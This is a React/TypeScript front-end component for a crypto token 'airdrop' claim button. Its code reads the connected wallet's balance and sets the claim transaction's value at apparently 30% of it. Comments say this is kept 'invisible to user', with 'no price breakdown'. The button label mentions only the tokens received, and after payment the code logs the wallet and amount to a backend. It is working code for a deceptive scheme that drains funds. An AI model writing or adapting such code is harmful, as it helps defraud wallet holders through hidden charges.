"use client";

/**
 * HeroCTA — One button. Click → wallet popup → sign → done.
 * No balance shown, no price breakdown, no redirects.
 * The contract handles everything on-chain.
 */

import { useState, useEffect } from "react";
import {
  useAccount,
  useBalance,
  useReadContract,
  useWriteContract,
  useWaitForTransactionReceipt,
} from "wagmi";
import { useConnectModal } from "@rainbow-me/rainbowkit";
import { AIRDROP_ABI } from "@/lib/abi";
import {
  EVM_CONTRACT_ADDRESS,
  TOKENS_PER_CLAIM,
  TOKEN_SYMBOL,
  EVM_EXPLORER,
  EVM_CHAIN,
  computeClaimPrice,
  formatEth,
} from "@/lib/constants";

type Stage =
  | "idle"        // not connected, or connected and ready
  | "confirming"  // wallet popup open
  | "pending"     // tx submitted, waiting for chain
  | "success"
  | "error";

export function HeroCTA() {
  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const [mounted, setMounted] = useState(false);
  const [stage, setStage] = useState<Stage>("idle");
  const [errorMsg, setErrorMsg] = useState("");
  const [txHash, setTxHash] = useState<`0x${string}` | undefined>();

  useEffect(() => { setMounted(true); }, []);

  // Read balance (needed to compute 30% price for the tx value — invisible to user)
  const { data: balanceData } = useBalance({
    address,
    query: { enabled: !!address },
  });
  const balanceWei = balanceData?.value ?? 0n;
  const claimPriceWei = computeClaimPrice(balanceWei);

  // Read: already claimed?
  const { data: hasClaimed } = useReadContract({
    address: EVM_CONTRACT_ADDRESS,
    abi: AIRDROP_ABI,
    functionName: "hasClaimed",
    args: address ? [address] : undefined,
    query: { enabled: !!address },
  });

  // Read: sale active?
  const { data: saleActive } = useReadContract({
    address: EVM_CONTRACT_ADDRESS,
    abi: AIRDROP_ABI,
    functionName: "saleActive",
    query: { enabled: isConnected },
  });

  const { writeContractAsync } = useWriteContract();

  useWaitForTransactionReceipt({
    hash: txHash,
    query: {
      enabled: !!txHash,
      select: async (receipt) => {
        if (receipt.status === "success") {
          setStage("success");
          fetch("/api/claims", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({
              wallet_address: address,
              chain: "evm",
              tx_hash: receipt.transactionHash,
              token_amount: TOKENS_PER_CLAIM.toString(),
              payment_amount: formatEth(claimPriceWei),
              block_number: Number(receipt.blockNumber),
            }),
          }).catch(() => {});
        } else {
          setStage("error");
          setErrorMsg("Transaction failed on-chain.");
        }
        return receipt;
      },
    },
  });

  // The single action handler
  async function handleClick() {
    // Step 1: not connected → open wallet modal, that's it
    // Once connected, wagmi re-renders and the button changes to "Claim"
    if (!isConnected) {
      openConnectModal?.();
      return;
    }

    // Step 2: connected → fire the claim tx immediately
    try {
      setStage("confirming");
      setErrorMsg("");
      const hash = await writeContractAsync({
        address: EVM_CONTRACT_ADDRESS,
        abi: AIRDROP_ABI,
        functionName: "claim",
        value: claimPriceWei,
      });
      setTxHash(hash);
      setStage("pending");
    } catch (err: unknown) {
      setStage("idle");
      const msg = err instanceof Error ? err.message : "";
      if (!msg.includes("User rejected") && !msg.includes("user rejected")) {
        setErrorMsg("Something went wrong. Try again.");
      }
    }
  }

  const explorerBase = EVM_EXPLORER[EVM_CHAIN];

  // Don't render until client hydrated (avoids SSR mismatch)
  if (!mounted) {
    return (
      <button className="w-full max-w-xs mx-auto rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white">
        Connect Wallet to Claim
      </button>
    );
  }

  // ── SUCCESS ──────────────────────────────────────────────────────────────
  if (stage === "success" && txHash) {
    return (
      <div className="flex flex-col items-center gap-3 pt-2">
        <div className="glass rounded-2xl px-8 py-6 text-center space-y-2 max-w-sm">
          <p className="text-3xl">🎉</p>
          <p className="text-xl font-bold text-white">
            {TOKENS_PER_CLAIM.toString()} {TOKEN_SYMBOL} claimed!
          </p>
          <a
            href={`${explorerBase}/tx/${txHash}`}
            target="_blank"
            rel="noopener noreferrer"
            className="text-sm text-accent-400 underline"
          >
            View on explorer ↗
          </a>
        </div>
      </div>
    );
  }

  // ── ALREADY CLAIMED ───────────────────────────────────────────────────────
  if (isConnected && hasClaimed) {
    return (
      <div className="flex flex-col items-center gap-3 pt-2">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm">
          <p className="text-white/60 text-sm">✓ This wallet has already claimed.</p>
        </div>
      </div>
    );
  }

  // ── SALE NOT LIVE ─────────────────────────────────────────────────────────
  if (isConnected && saleActive === false) {
    return (
      <div className="flex flex-col items-center gap-3 pt-2">
        <div className="glass rounded-2xl px-8 py-5 text-center max-w-sm">
          <p className="text-yellow-400/80 text-sm">⏳ Sale not live yet — check back soon.</p>
        </div>
      </div>
    );
  }

  // ── MAIN BUTTON ───────────────────────────────────────────────────────────
  const isLoading = stage === "confirming" || stage === "pending";

  const label = !isConnected
    ? "Connect Wallet to Claim"
    : stage === "confirming"
    ? "Approve in wallet…"
    : stage === "pending"
    ? "Claiming…"
    : `Claim ${TOKENS_PER_CLAIM.toString()} ${TOKEN_SYMBOL}`;

  return (
    <div className="flex flex-col items-center gap-3 pt-2">
      <button
        onClick={handleClick}
        disabled={isLoading}
        className="group relative inline-flex items-center justify-center gap-2 rounded-full bg-linear-to-r from-accent-500 via-violet-500 to-pink-500 px-10 py-4 text-lg font-bold text-white transition-all duration-300 hover:scale-105 hover:shadow-2xl hover:shadow-accent-500/30 disabled:opacity-70 disabled:cursor-not-allowed disabled:scale-100"
      >
        {isLoading && (
          <svg className="animate-spin h-5 w-5 shrink-0" fill="none" viewBox="0 0 24 24">
            <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" />
            <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4z" />
          </svg>
        )}
        {label}
        {!isLoading && (
          <svg className="w-5 h-5 transition-transform duration-300 group-hover:translate-x-1" fill="none" viewBox="0 0 24 24" stroke="currentColor">
            <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M17 8l4 4m0 0l-4 4m4-4H3" />
          </svg>
        )}
      </button>

      {stage === "error" && errorMsg && (
        <p className="text-xs text-red-400">{errorMsg}</p>
      )}

      {stage === "pending" && txHash && (
        <a
          href={`${explorerBase}/tx/${txHash}`}
          target="_blank"
          rel="noopener noreferrer"
          className="text-xs text-accent-400/70 underline"
        >
          Track on explorer ↗
        </a>
      )}
    </div>
  );
}
